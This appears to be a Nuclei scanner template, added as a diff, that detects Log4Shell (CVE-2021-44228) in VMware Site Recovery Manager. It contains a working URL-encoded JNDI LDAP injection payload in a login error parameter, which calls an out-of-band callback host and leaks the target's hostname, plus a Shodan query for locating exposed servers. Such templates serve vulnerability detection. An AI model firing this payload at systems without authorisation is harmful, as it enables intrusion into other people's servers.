@@ -1,0 +1,65 @@
+id: vmware-siterecovery-log4j-rce
+
+info:
+  name: VMware Site Recovery Manager - Remote Code Execution (Apache Log4j)
+  author: akincibor
+  severity: critical
+  description: |
+    VMware Site Recovery Manager is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"VMware Site Recovery Manager"
+  tags: cve,cve2021,jndi,log4j,rce,oast,vmware,siterecovery,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<title>Error - Site Recovery</title>'
+
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 4a0a004730450220068ae0aada7f71b9ac4bb6cb6abc843e7bf9eb3e33e0dbea8bcaa6ee27ce2ac102210094a1c4db5a0ab63751f5a08bf5cdda2b06f3938552570304baff781b3b1373cc:922c64590222798bb761d5b6d8e72950
